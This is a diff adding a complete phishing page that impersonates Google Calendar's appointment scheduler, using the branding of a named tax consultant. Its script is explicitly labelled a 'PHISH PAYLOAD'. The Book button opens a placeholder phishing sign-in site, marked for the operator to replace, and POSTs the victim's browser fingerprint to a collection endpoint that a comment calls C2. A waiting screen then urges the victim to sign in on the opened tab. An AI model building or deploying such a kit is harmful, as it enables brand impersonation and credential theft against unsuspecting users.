@@ -1,0 +1,851 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Google Calendar - Schedule appointment</title>
+<link rel="manifest" href="data:application/manifest+json,{\"name\":\"Google Calendar\",\"short_name\":\"Calendar\",\"icons\":[{\"src\":\"https://www.gstatic.com/images/branding/product/1x/calendar_48dp.png\",\"sizes\":\"48x48\"}],\"theme_color\":\"#4285f4\",\"background_color\":\"#fafbfc\"}">
+<link rel="icon" href="https://www.gstatic.com/calendar/images/favicon7.ico">
+<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@300;400;500;600;700&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/icon?family=Material+Symbols+Outlined" rel="stylesheet">
+
+<style>
+:root {
+  --google-blue: #1a73e8;
+  --google-blue-light: #8ab4f8;
+  --google-blue-hover: #1557b0;
+  --google-green: #34a853;
+  --google-gray-50: #f8f9fa;
+  --google-gray-100: #f1f3f4;
+  --google-gray-200: #e8eaed;
+  --google-gray-300: #dadce0;
+  --google-gray-400: #bdbfc4;
+  --google-gray-500: #9aa0a6;
+  --google-gray-600: #80868b;
+  --google-gray-700: #5f6368;
+  --google-gray-900: #202124;
+  --elevation-1: 0 1px 2px rgba(60,64,67,.3),0 1px 3px 1px rgba(60,64,67,.15);
+  --elevation-2: 0 1px 2px rgba(60,64,67,.3),0 2px 6px 2px rgba(60,64,67,.15);
+  --elevation-3: 0 4px 8px 3px rgba(60,64,67,.15),0 1px 3px rgba(60,64,67,.3);
+}
+
+* {box-sizing:border-box;margin:0;padding:0}
+body {
+  font-family:'Google Sans','Roboto',sans-serif;
+  background:var(--google-gray-50);
+  color:var(--google-gray-900);
+  font-size:14px;
+  line-height:1.5;
+  padding:24px;
+  min-height:100vh;
+}
+
+/* **MODAL OVERLAY - FULL SCREEN CENTERED** */
+.modal-overlay {
+  position:fixed;top:0;left:0;right:0;bottom:0;
+  background:rgba(32,33,36,.6);backdrop-filter:blur(8px);
+  display:flex;align-items:center;justify-content:center;
+  z-index:9999;padding:24px;
+  opacity:0;visibility:hidden;transition:all .3s cubic-bezier(0.4,0,0.2,1);
+}
+
+.modal-overlay.show {
+  opacity:1;visibility:visible;
+}
+
+.modal {
+  background:#fff;border-radius:24px;
+  max-width:480px;width:100%;max-height:90vh;
+  box-shadow:0 20px 60px rgba(0,0,0,.3);
+  transform:scale(.8) translateY(20px);
+  transition:all .3s cubic-bezier(0.4,0,0.2,1);
+  overflow:hidden;
+}
+
+.modal-overlay.show .modal {
+  transform:scale(1) translateY(0);
+}
+
+.modal-header {
+  padding:32px 32px 24px;
+  border-bottom:1px solid var(--google-gray-200);
+  text-align:center;
+}
+
+.modal-icon {
+  width:64px;height:64px;margin:0 auto 20px;
+  background:linear-gradient(135deg,var(--google-green),#7cb342);
+  border-radius:50%;display:flex;align-items:center;justify-content:center;
+  box-shadow:var(--elevation-3);
+}
+
+.modal-icon svg {
+  width:32px;height:32px;color:#fff;
+  font-variation-settings:'wght' 400;
+}
+
+.modal-title {
+  font-size:24px;font-weight:600;margin:0 0 8px 0;
+  color:var(--google-gray-900);
+}
+
+.modal-subtitle {
+  font-size:15px;color:var(--google-gray-600);
+  margin:0;line-height:1.5;
+}
+
+.modal-content {
+  padding:24px 32px 32px;
+}
+
+.appointment-details {
+  background:var(--google-gray-50);
+  border-radius:16px;padding:24px;
+  margin-bottom:24px;
+  border-left:4px solid var(--google-blue);
+}
+
+.detail-row {
+  display:flex;justify-content:space-between;
+  margin-bottom:12px;font-size:15px;
+}
+
+.detail-label {
+  font-weight:500;color:var(--google-gray-700);
+}
+
+.detail-value {
+  font-weight:600;color:var(--google-gray-900);
+}
+
+.modal-description {
+  font-size:14px;color:var(--google-gray-600);
+  line-height:1.6;margin-bottom:32px;
+  text-align:center;
+}
+
+.modal-actions {
+  display:flex;gap:16px;justify-content:center;
+  padding-top:16px;border-top:1px solid var(--google-gray-200);
+}
+
+.btn {
+  flex:1;max-width:160px;padding:14px 24px;
+  border:none;border-radius:24px;font-size:15px;
+  font-weight:600;font-family:inherit;cursor:pointer;
+  transition:all .2s cubic-bezier(0.4,0,0.2,1);
+  display:flex;align-items:center;justify-content:center;
+  gap:8px;height:52px;
+}
+
+.btn-cancel {
+  background:var(--google-gray-100);
+  color:var(--google-gray-700);
+  box-shadow:var(--elevation-1);
+}
+
+.btn-cancel:hover {
+  background:var(--google-gray-200);
+  box-shadow:var(--elevation-2);
+}
+
+.btn-sign {
+  background:var(--google-blue);
+  color:#fff;box-shadow:var(--elevation-2);
+}
+
+.btn-sign:hover {
+  background:var(--google-blue-hover);
+  box-shadow:var(--elevation-3);
+  transform:translateY(-1px);
+}
+
+.btn:disabled {
+  opacity:.6;cursor:not-allowed;transform:none !important;
+}
+
+.container {
+  max-width:1600px;
+  margin:0 auto;
+  background:#fff;
+  border-radius:24px;
+  box-shadow:var(--elevation-3);
+  overflow:hidden;
+}
+
+.header {
+  padding:32px 40px 24px;
+  border-bottom:1px solid var(--google-gray-200);
+  display:flex;
+  align-items:flex-start;
+  gap:24px;
+}
+
+.avatar {
+  width:56px;height:56px;
+  border-radius:50%;
+  background:linear-gradient(135deg,var(--google-blue),#34a853);
+  display:flex;align-items:center;justify-content:center;
+  color:#fff;font-weight:600;font-size:20px;
+  box-shadow:var(--elevation-2);
+  flex-shrink:0;
+}
+
+.header-content h1 {
+  font-size:28px;font-weight:500;margin:0 0 8px 0;line-height:1.2;
+}
+
+.header-meta {
+  font-size:16px;color:var(--google-gray-700);margin-bottom:12px;font-weight:400;
+}
+
+.header-details {
+  display:flex;flex-wrap:wrap;gap:24px;font-size:14px;
+}
+
+.detail-item {
+  display:flex;align-items:center;gap:6px;color:var(--google-gray-700);
+}
+
+.detail-item::before {
+  font-family:'Material Symbols Outlined';font-size:18px;line-height:1;font-variation-settings:'wght' 400;
+}
+
+.duration::before {content:'schedule_send';}
+.phone::before {content:'call';}
+.location::before {content:'location_on';}
+
+.description {
+  margin:24px 40px;
+  padding:24px;
+  background:var(--google-gray-100);
+  border-radius:16px;
+  border-left:4px solid var(--google-blue);
+  font-size:15px;line-height:1.6;color:var(--google-gray-700);
+}
+
+.scheduler {
+  padding:48px 40px 40px;
+  background:#fafbfc;
+  min-height:800px;
+}
+
+.scheduler-header {
+  display:flex;justify-content:space-between;align-items:center;
+  margin-bottom:36px;font-size:18px;font-weight:500;
+}
+
+.timezone {
+  color:var(--google-gray-500);font-size:14px;font-weight:400;
+  background:var(--google-gray-100);
+  padding:8px 16px;
+  border-radius:20px;
+  font-family:monospace;
+}
+
+.calendar-layout {
+  display:grid;
+  grid-template-columns:320px 1fr;
+  gap:48px;
+  max-width:1600px;
+  margin:0 auto;
+}
+
+.calendar-nav {
+  display:flex;align-items:center;gap:16px;
+  padding:20px;border-radius:20px;
+  background:#fff;box-shadow:var(--elevation-2);
+  margin-bottom:24px;
+}
+
+.nav-arrow {
+  width:44px;height:44px;border-radius:50%;
+  background:none;border:none;display:flex;align-items:center;justify-content:center;
+  cursor:pointer;font-size:24px;font-family:'Material Symbols Outlined';
+  color:var(--google-gray-600);transition:all .2s;font-variation-settings:'wght' 400;
+}
+
+.nav-arrow:hover {background:var(--google-gray-100);color:var(--google-gray-900);}
+
+.month-display {
+  font-size:22px;font-weight:600;
+  min-width:160px;text-align:center;
+}
+
+.mini-calendar {
+  background:#fff;border-radius:20px;
+  padding:24px;box-shadow:var(--elevation-3);
+  height:400px;
+  overflow:hidden;
+}
+
+.weekdays {
+  display:grid;grid-template-columns:repeat(7,1fr);
+  gap:12px;margin-bottom:16px;
+  font-weight:500;color:var(--google-gray-700);
+  font-size:14px;text-align:center;
+  padding-bottom:16px;
+  border-bottom:1px solid var(--google-gray-200);
+}
+
+.weekday {padding:10px 0;font-weight:600}
+
+.calendar-days {
+  display:grid;grid-template-columns:repeat(7,1fr);
+  gap:8px;height:280px;
+}
+
+.calendar-day {
+  aspect-ratio:1;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  cursor:pointer;font-weight:500;font-size:15px;
+  transition:all .2s ease;border:2px solid transparent;
+}
+
+.calendar-day:hover:not(.disabled):not(.other-month) {
+  background:var(--google-gray-100);transform:scale(1.08);
+}
+
+.calendar-day.today {
+  background:var(--google-blue);color:#fff;box-shadow:var(--elevation-2);
+}
+
+.calendar-day.selected {
+  background:var(--google-blue);color:#fff;
+  border-color:#fff;box-shadow:var(--elevation-3);transform:scale(1.08);
+}
+
+.calendar-day.other-month {color:var(--google-gray-400);cursor:default;}
+.calendar-day.disabled {color:var(--google-gray-400);cursor:not-allowed;}
+
+.week-view {
+  display:grid;grid-template-columns:repeat(7,1fr);
+  gap:28px;min-height:600px;
+}
+
+.weekday-header {
+  text-align:center;font-size:15px;font-weight:500;
+  color:var(--google-gray-500);margin-bottom:24px;
+  padding:16px 0;border-bottom:1px solid var(--google-gray-200);
+}
+
+.day-column {
+  height:100%;display:flex;flex-direction:column;
+}
+
+.day-column h3 {
+  font-size:15px;font-weight:600;color:var(--google-gray-700);
+  margin-bottom:24px;text-align:center;
+  padding:20px 0 16px;border-bottom:2px solid var(--google-gray-200);
+}
+
+.day-date {
+  font-size:24px;font-weight:700;line-height:1;
+  display:block;margin-top:4px;
+}
+
+.day-month {font-size:14px;font-weight:500;color:var(--google-gray-600);}
+
+.time-slots {
+  flex:1;display:flex;flex-direction:column;
+  gap:14px;max-height:500px;
+  overflow-y:auto;padding:8px;
+  scrollbar-width:thin;scrollbar-color:var(--google-gray-300) transparent;
+}
+
+.time-slots::-webkit-scrollbar {
+  width:6px;
+}
+.time-slots::-webkit-scrollbar-track {background:transparent;}
+.time-slots::-webkit-scrollbar-thumb {
+  background:var(--google-gray-300);border-radius:3px;
+}
+
+.time-slot {
+  background:#fff;border:1px solid var(--google-gray-300);
+  border-radius:24px;padding:12px 16px;
+  cursor:pointer;
+  font-size:13px;font-weight:500;
+  transition:all .25s;box-shadow:var(--elevation-1);
+  position:relative;overflow:hidden;
+  display:flex !important;
+  align-items:center !important;
+  justify-content:center !important;
+  text-align:center !important;
+  min-height:44px;
+  line-height:1.2 !important;
+  white-space:nowrap !important;
+}
+
+.time-slot:hover:not(.booked):not(.selected):not(.day-selected) {
+  border-color:var(--google-blue);box-shadow:var(--elevation-3);
+  transform:translateY(-3px);
+}
+
+.time-slot.selected {
+  border-color:var(--google-blue);background:linear-gradient(135deg,var(--google-blue),var(--google-blue-light));
+  color:#fff;box-shadow:var(--elevation-3);
+}
+
+.time-slot.day-selected {
+  background:var(--google-blue-light);
+  border-color:var(--google-blue);
+  color:var(--google-blue);
+  box-shadow:var(--elevation-2);
+}
+
+.time-slot.booked {
+  background:var(--google-gray-100);color:var(--google-gray-500);
+  cursor:not-allowed;border-color:var(--google-gray-300);
+}
+
+.time-slot.booked::after {
+  content:'Booked';
+  position:absolute;top:50%;left:50%;
+  transform:translate(-50%, -50%);
+  background:var(--google-gray-400);color:#fff;
+  font-size:10px;font-weight:500;
+  padding:3px 7px;border-radius:10px;
+  white-space:nowrap;line-height:1.1;
+}
+
+.time-slot:not(.booked)::after {content:none;}
+
+.loading {
+  grid-column:1/-1;text-align:center;
+  padding:80px 40px;color:var(--google-gray-500);
+  font-size:18px;
+}
+
+.loading-spinner {
+  width:40px;height:40px;border:4px solid var(--google-gray-200);
+  border-top:4px solid var(--google-blue);border-radius:50%;
+  animation:spin 1s linear infinite;margin:0 auto 24px;
+}
+
+@keyframes spin {to{transform:rotate(360deg)}}
+
+.footer {
+  padding:40px;text-align:center;border-top:1px solid var(--google-gray-200);
+  background:var(--google-gray-50);font-size:13px;color:var(--google-gray-500);
+}
+
+.footer a {color:var(--google-blue);text-decoration:none;font-weight:500;}
+.footer-links {margin:16px 0;display:flex;justify-content:center;gap:32px;flex-wrap:wrap;}
+
+@media (max-width:1400px) {.calendar-layout {grid-template-columns:1fr;gap:40px}}
+@media (max-width:768px) {
+  body {padding:20px}
+  .container {border-radius:20px;margin:0}
+  .header,.scheduler,.description {padding-left:28px;padding-right:28px}
+  .week-view {grid-template-columns:repeat(2,1fr);gap:24px}
+  .time-slot {font-size:12px;padding:11px 14px;min-height:42px;}
+  .modal {margin:16px;max-width:calc(100% - 32px);}
+}
+
+@media (max-width:500px) {
+  .week-view {grid-template-columns:1fr}
+  .header-details {flex-direction:column;gap:16px}
+  .calendar-layout {gap:32px}
+  .time-slot {font-size:12px;padding:10px 12px;min-height:40px;}
+  .modal-actions {flex-direction:column;gap:12px;}
+}
+</style>
+</head>
+
+<body>
+<div class="container">
+  <!-- Header -->
+  <div class="header">
+    <div class="avatar">AR</div>
+    <div class="header-content">
+      <h1>Allan Rolnick</h1>
+      <div class="header-meta">Tax Consultation</div>
+      <div class="header-details">
+        <div class="detail-item duration">30 minute appointments</div>
+        <div class="detail-item phone">Phone call</div>
+        <div class="detail-item location">Online</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Description -->
+  <div class="description">
+    I am the guy you call when you have a problem with the IRS and want help fixing it.
+  </div>
+
+  <!-- Scheduler -->
+  <div class="scheduler">
+    <div class="scheduler-header">
+      <div>Choose a time</div>
+      <div class="timezone" id="timezoneDisplay">(GMT-05:00) Central Time (Chicago)</div>
+    </div>
+
+    <div class="calendar-layout">
+      <!-- Mini Calendar -->
+      <div>
+        <div class="calendar-nav">
+          <button class="nav-arrow" id="prevMonth" title="Previous month">chevron_left</button>
+          <div class="month-display" id="monthDisplay">November 2026</div>
+          <button class="nav-arrow" id="nextMonth" title="Next month">chevron_right</button>
+        </div>
+        <div class="mini-calendar">
+          <div class="weekdays">
+            <div class="weekday">SUN</div><div class="weekday">MON</div><div class="weekday">TUE</div>
+            <div class="weekday">WED</div><div class="weekday">THU</div><div class="weekday">FRI</div><div class="weekday">SAT</div>
+          </div>
+          <div class="calendar-days" id="calendarDays"></div>
+        </div>
+      </div>
+
+      <!-- Week View -->
+      <div class="week-view" id="weekView">
+        <div class="loading" id="loading">
+          <div class="loading-spinner"></div>
+          Loading available times...
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <div>Appointment schedules are powered by Google Calendar</div>
+    <div class="footer-links">
+      <a href="#" target="_blank">Privacy Policy</a>
+      <a href="#" target="_blank">Terms of Service</a>
+      <a href="#" target="_blank">Send feedback</a>
+    </div>
+    <div style="margin-top:20px;font-size:12px">
+      © 2026 Google LLC
+    </div>
+  </div>
+</div>
+
+<!-- **SEXY GOOGLE MODAL** -->
+<div class="modal-overlay" id="appointmentModal">
+  <div class="modal">
+    <div class="modal-header">
+      <div class="modal-icon">
+        <span class="material-symbols-outlined" id="modalIcon">schedule</span>
+      </div>
+      <h2 class="modal-title" id="modalTitle">Appointment Selected</h2>
+      <p class="modal-subtitle" id="modalSubtitle"></p>
+    </div>
+    
+    <div class="modal-content">
+      <div class="appointment-details" id="appointmentDetails">
+        <div class="detail-row">
+          <span class="detail-label">Date:</span>
+          <span class="detail-value" id="modalDate"></span>
+        </div>
+        <div class="detail-row">
+          <span class="detail-label">Time:</span>
+          <span class="detail-value" id="modalTime"></span>
+        </div>
+      </div>
+      
+      <div id="waitingContent" style="display:none;text-align:center;padding:24px;">
+        <div class="loading-spinner" style="width:48px;height:48px;margin:0 auto 20px;"></div>
+        <p style="font-size:16px;font-weight:500;color:var(--google-gray-700);margin:0 0 8px;">Waiting for confirmation...</p>
+        <p style="font-size:14px;color:var(--google-gray-500);">Please complete sign in on the opened tab</p>
+      </div>
+      
+      <p class="modal-description" id="modalDescription">
+        Click Book to confirm your appointment. Allan will receive the invitation link automatically.
+      </p>
+    </div>
+    
+    <div class="modal-actions" id="modalActions">
+      <button class="btn btn-cancel" id="cancelBtn">
+        <span class="material-symbols-outlined">close</span>
+        Cancel
+      </button>
+      <button class="btn btn-sign" id="signBtn">
+        <span class="material-symbols-outlined">login</span>
+        Book
+      </button>
+    </div>
+  </div>
+</div>
+
+<script>
+// **REAL-WORLD DATES + AUTO TIMEZONE**
+class GoogleScheduler {
+  constructor() {
+    this.currentDate = new Date();
+    this.selectedDate = new Date();
+    this.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    this.selectedTime = null;
+    this.init();
+  }
+
+  init() {
+    this.updateTimezoneDisplay();
+    this.cacheElements();
+    this.bindEvents();
+    this.render();
+  }
+
+  updateTimezoneDisplay() {
+    const offset = new Date().getTimezoneOffset();
+    const hours = Math.abs(Math.floor(offset / 60));
+    const minutes = Math.abs(offset % 60);
+    const sign = offset <= 0 ? '+' : '-';
+    
+    const tzName = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const tzDisplay = `${tzName.replace('/', ' ')} (${sign}${hours.toString().padStart(2,'0')}:${minutes.toString().padStart(2,'0')})`;
+    
+    document.getElementById('timezoneDisplay').textContent = tzDisplay;
+  }
+
+  cacheElements() {
+    this.monthDisplay = document.getElementById('monthDisplay');
+    this.calendarDays = document.getElementById('calendarDays');
+    this.weekView = document.getElementById('weekView');
+    this.loading = document.getElementById('loading');
+    this.prevMonthBtn = document.getElementById('prevMonth');
+    this.nextMonthBtn = document.getElementById('nextMonth');
+  }
+
+  bindEvents() {
+    this.prevMonthBtn.onclick = () => this.changeMonth(-1);
+    this.nextMonthBtn.onclick = () => this.changeMonth(1);
+  }
+
+  changeMonth(direction) {
+    this.currentDate.setMonth(this.currentDate.getMonth() + direction);
+    if (this.currentDate.getMonth() === 0 && direction === -1) {
+      this.currentDate.setFullYear(this.currentDate.getFullYear() - 1);
+    }
+    this.render();
+  }
+
+  render() {
+    this.showLoading();
+    setTimeout(() => {
+      this.renderMonthDisplay();
+      this.renderMiniCalendar();
+      this.renderWeekView();
+      this.hideLoading();
+    }, 800);
+  }
+
+  showLoading() { this.loading.style.display = 'block'; }
+  hideLoading() { this.loading.style.display = 'none'; }
+
+  renderMonthDisplay() {
+    const options = { month: 'long', year: 'numeric' };
+    this.monthDisplay.textContent = this.currentDate.toLocaleDateString('en-US', options);
+  }
+
+  renderMiniCalendar() {
+    const year = this.currentDate.getFullYear();
+    const month = this.currentDate.getMonth();
+    const firstDay = new Date(year, month, 1).getDay();
+    const daysInMonth = new Date(year, month + 1, 0).getDate();
+    
+    let html = '';
+    for (let i = 0; i < firstDay; i++) {
+      html += `<div class="calendar-day other-month disabled"></div>`;
+    }
+    
+    for (let day = 1; day <= daysInMonth; day++) {
+      const date = new Date(year, month, day);
+      const dayClass = [
+        'calendar-day',
+        this.isToday(date) ? 'today' : '',
+        this.selectedDate.toDateString() === date.toDateString() ? 'selected' : ''
+      ].filter(Boolean).join(' ');
+      
+      html += `<div class="${dayClass}" data-date="${date.toDateString()}">${day}</div>`;
+    }
+    
+    const totalCells = firstDay + daysInMonth;
+    for (let i = totalCells; i < 42; i++) {
+      html += `<div class="calendar-day other-month disabled"></div>`;
+    }
+    
+    this.calendarDays.innerHTML = html;
+    
+    this.calendarDays.querySelectorAll('.calendar-day:not(.other-month):not(.disabled)')
+      .forEach(dayEl => {
+        dayEl.onclick = (e) => {
+          this.selectDay(new Date(e.target.dataset.date));
+        };
+      });
+  }
+
+  renderWeekView() {
+    const weekStart = new Date(this.selectedDate);
+    weekStart.setDate(weekStart.getDate() - weekStart.getDay());
+    
+    let html = '';
+    for (let i = 0; i < 7; i++) {
+      const day = new Date(weekStart);
+      day.setDate(weekStart.getDate() + i);
+      html += this.renderDayColumn(day);
+    }
+    this.weekView.innerHTML = html;
+  }
+
+  formatTime(timeStr) {
+  const [hourStr, minute] = timeStr.split(':');
+  let hour = parseInt(hourStr, 10);
+  const period = hour >= 12 ? 'pm' : 'am';
+  let displayHour = hour % 12;
+  if (displayHour === 0) displayHour = 12;
+  return `${displayHour}:${minute.padStart(2,'0')}${period}`;
+  }
+
+  renderDayColumn(date) {
+    const isSelectedDay = this.selectedDate.toDateString() === date.toDateString();
+    const dayName = date.toLocaleDateString('en-US', { weekday: 'short', timeZone: this.timezone });
+    const dayNum = date.getDate();
+    const monthName = date.toLocaleDateString('en-US', { month: 'short', timeZone: this.timezone });
+    
+    let slotsHtml = '';
+    const times = [
+      '09:00','09:30','10:00','10:30','11:00','11:30',
+  '12:00','12:30','13:00','13:30','14:00','14:30',
+  '15:00','15:30','16:00','16:30'
+    ];
+    
+    times.forEach(time => {
+      const formattedTime = this.formatTime(time);
+      const isBooked = Math.random() < 0.25;
+      const slotClass = [
+        'time-slot',
+        isBooked ? 'booked' : '',
+        isSelectedDay && this.selectedTime === time ? 'selected' : '',
+        isSelectedDay ? 'day-selected' : ''
+      ].filter(Boolean).join(' ');
+      
+      slotsHtml += `<div class="${slotClass}" data-time="${time}" data-date="${date.toDateString()}">${formattedTime}</div>`;
+    });
+
+    return `
+      <div class="day-column">
+        <div class="weekday-header">${dayName}</div>
+        <h3>
+          <span class="day-month">${monthName}</span>
+          <span class="day-date">${dayNum}</span>
+        </h3>
+        <div class="time-slots">${slotsHtml}</div>
+      </div>
+    `;
+  }
+
+  selectDay(date) {
+    this.selectedDate = date;
+    this.renderWeekView();
+  }
+
+  isToday(date) {
+    const today = new Date();
+    return date.toDateString() === today.toDateString();
+  }
+}
+
+// INIT SCHEDULER
+const scheduler = new GoogleScheduler();
+
+// **MODAL LOGIC + PHISH PAYLOAD**
+const modal = document.getElementById('appointmentModal');
+const cancelBtn = document.getElementById('cancelBtn');
+const signBtn = document.getElementById('signBtn');
+
+// **CHANGE: TIGHTER TIME FORMAT "10:00am"**
+document.addEventListener('click', function(e) {
+  if (e.target.classList.contains('time-slot') && !e.target.classList.contains('booked')) {
+    e.preventDefault();
+    e.stopPropagation();
+    
+    // Update scheduler state
+    scheduler.selectedTime = e.target.dataset.time;
+    scheduler.renderWeekView();
+    
+    // Populate modal
+    const date = new Date(e.target.dataset.date);
+    const time = e.target.dataset.time;
+    
+    document.getElementById('modalDate').textContent = date.toLocaleDateString('en-US', { 
+      weekday: 'short', 
+      year: 'numeric', 
+      month: 'short', 
+      day: 'numeric' 
+    });
+    document.getElementById('modalTime').textContent = scheduler.formatTime(time);
+    
+    // Show modal
+    modal.classList.add('show');
+    document.body.style.overflow = 'hidden';
+  }
+});
+
+// Close modal
+function closeModal() {
+  modal.classList.remove('show');
+  document.body.style.overflow = '';
+  scheduler.selectedTime = null;
+  scheduler.renderWeekView();
+  
+  // Reset to appointment selected state
+  document.getElementById('modalTitle').textContent = 'Appointment Selected';
+  document.getElementById('modalIcon').textContent = 'schedule';
+  document.getElementById('appointmentDetails').style.display = 'block';
+  document.getElementById('waitingContent').style.display = 'none';
+  document.getElementById('modalDescription').style.display = 'block';
+  document.getElementById('modalActions').style.display = 'flex';
+}
+
+// Event listeners
+cancelBtn.onclick = closeModal;
+signBtn.onclick = function() {
+  // **PHISH PAYLOAD - CUSTOM REDIRECT**
+  const victimData = {
+    date: document.getElementById('modalDate').textContent,
+    time: document.getElementById('modalTime').textContent,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    ip: 'geolocate_here',
+    user_agent: navigator.userAgent,
+    language: navigator.language,
+    screen: `${screen.width}x${screen.height}`,
+    timestamp: new Date().toISOString()
+  };
+  
+  // **CHANGE THIS URL TO YOUR PHISH LANDING**
+  window.open('https://your-phish-site.com/signin', '_blank');
+  
+  // Optional: Send data to C2
+  fetch('/api/book', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(victimData)
+  }).catch(() => {});
+  
+  // **NEW: Switch to waiting state - main modal stays open**
+  document.getElementById('modalTitle').textContent = 'Waiting for confirmation';
+  document.getElementById('modalIcon').textContent = 'hourglass_empty';
+  document.getElementById('appointmentDetails').style.display = 'none';
+  document.getElementById('waitingContent').style.display = 'block';
+  document.getElementById('modalDescription').style.display = 'none';
+  document.getElementById('modalActions').style.display = 'none';
+};
+
+// Close on overlay click
+modal.querySelector('.modal-overlay').onclick = (e) => {
+  if (e.target === modal.querySelector('.modal-overlay')) closeModal();
+};
+
+// ESC key
+document.addEventListener('keydown', (e) => {
+  if (e.key === 'Escape' && modal.classList.contains('show')) {
+    closeModal();
+  }
+});
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/dist/confetti.browser.min.js"></script>
+</body>
+</html>
